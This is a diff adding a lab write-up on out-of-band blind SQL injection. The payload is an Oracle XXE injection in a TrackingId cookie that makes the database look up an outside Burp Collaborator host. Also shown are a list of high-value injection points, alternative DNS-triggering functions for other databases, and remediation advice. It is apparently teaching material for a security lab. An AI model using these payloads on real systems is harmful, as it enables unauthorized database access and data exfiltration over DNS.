@@ -2117,3 +2117,170 @@ EXtract password char by char to fetch admin password.Go to my account and enter
 - Add uniform response time (mitigates timing leaks)
 
 ---
+
+# Lab-13 📝 **Lab Write-Up — OAST-Based Blind SQL Injection (DNS Interaction via XXE)**
+
+---
+
+## 📌 1-Line Summary
+
+This attack uses **blind SQL injection + XXE** to force the backend database to perform a **DNS lookup** to a Burp Collaborator domain, proving the SQL injection exists even without visible errors or delays.
+
+---
+
+## ❓ What Is This Topic? (OAST / Out-of-Band SQL Injection)
+
+**OAST (Out-of-Band Application Security Testing)** is used when normal SQL injection techniques fail because:
+
+- no errors  
+- no output  
+- no delay  
+- no Boolean behavior  
+
+In this method:
+
+1. You send an SQL payload.
+2. The database triggers a DNS lookup to **your server**.
+3. That DNS entry = **proof of SQL injection**.
+
+This works because DNS traffic is rarely blocked in production, allowing attackers to also **exfiltrate sensitive data over DNS**.
+
+---
+
+## ⚠️ Why This Matters (Real-World Impact)
+
+Modern production apps often:
+
+- suppress SQL errors  
+- execute queries asynchronously  
+- hide DB output  
+- block time delays  
+- sanitize reflected responses  
+
+➡️ Making **Boolean, Error-Based, and Time-Based SQLi useless**.
+
+But OAST SQLi bypasses everything.
+
+If an attacker can force DNS lookups from the DB:
+
+- ✔️ SQLi is confirmed even when app stays silent  
+- ✔️ Data (passwords, keys, tokens) can be encoded inside DNS requests  
+- ✔️ WAF & logging are bypassed  
+- ✔️ Entire DB rows can be extracted  
+- ✔️ Internal servers can be reached  
+
+This is considered **critical severity**.
+
+---
+
+## 🎯 High-Value Endpoints for OAST SQLi
+
+OAST is extremely effective in:
+
+- Cookies (TrackingId, SessionId)  
+- Headers (User-Agent, X-Forwarded-For, Referer)  
+- Analytics & tracking endpoints  
+- Background task processors  
+- Logging systems  
+- PDF / XML / report generators  
+- Email rendering engines  
+- ORM debugging modes  
+- Admin exports & scheduled SQL jobs  
+
+Any SQL query executed *outside* the request-response cycle is ideal for OAST exploitation.
+
+---
+
+## 🧪 Lab Walkthrough
+
+### **Step 1 — Intercept Request Containing TrackingId**
+- Open Burp → Proxy → Intercept **ON**
+- Browse homepage
+- Capture request with:
+Cookie: TrackingId=xyz
+---
+
+### **Step 2 — Replace TrackingId with XXE-SQLi OAST Payload**
+
+The official Oracle DNS-trigger payload:
+x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-DOMAIN/"> %remote;]>'),'/l') FROM dual--
+
+This uses:
+
+- **xmltype()**  
+- **external entity loading**  
+- **DNS resolution**  
+
+to force the backend to perform an external lookup.
+
+---
+
+### **Step 3 — Insert Burp Collaborator Payload**
+
+In Burp:
+
+`Right-click → Insert Collaborator Payload`
+
+Example:
+abcd123xyz.burpcollaborator.net
+
+Final injected cookie:
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://abcd123xyz.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
+---
+
+### **Step 4 — Send Request → Poll Collaborator for DNS Lookups**
+
+- Go to **Burp → Collaborator → Poll**
+- If any DNS interaction appears → SQLi confirmed → Lab solved.
+
+---
+
+## 🖼️ Evidence (Screenshots)
+
+2️⃣ **Screenshot — Injected TrackingId payload in Burp**  
+![ Injected TrackingId](../images/injected-oast-payload.png)
+
+3️⃣ **Screenshot — DNS interaction received in Collaborator**  
+![DNS interaction collaborator](../images/collab-dns-hit.png)
+
+---
+
+## 🔧 Troubleshooting
+
+If **no DNS interaction** appears:
+
+- payload may be incorrectly URL-encoded  
+- Collaborator domain not inserted properly  
+- WAF filtering the query  
+- XML parsing disabled  
+- app using different DB engine → try DB-specific payload  
+
+If XML parser error appears:
+
+- remove EXTRACTVALUE() for MySQL  
+- use LOAD_FILE(), dnslookup(), or MSSQL xp_dirtree  
+
+If completely silent:
+
+- app may be using background workers  
+- use **direct DNS functions** (Oracle UTL_INADDR.GET_HOST_ADDRESS, MySQL LOAD_FILE, MSSQL xp_dirtree)
+
+---
+
+## 🛡️ Remediation (Fix)
+
+**1. Parameterized SQL Queries**  
+Use prepared statements on all database interactions.
+
+**2. Disable Dangerous DB Features**  
+- disable external entity resolution  
+- restrict Oracle packages: UTL_HTTP, UTL_INADDR  
+- block MSSQL xp_* functions  
+
+**3. Egress Control**  
+Block outbound DNS/HTTP except internal resolvers.
+
+**4. WAF Filtering**  
+Detect SQL + XXE hybrid payloads.
+
+---
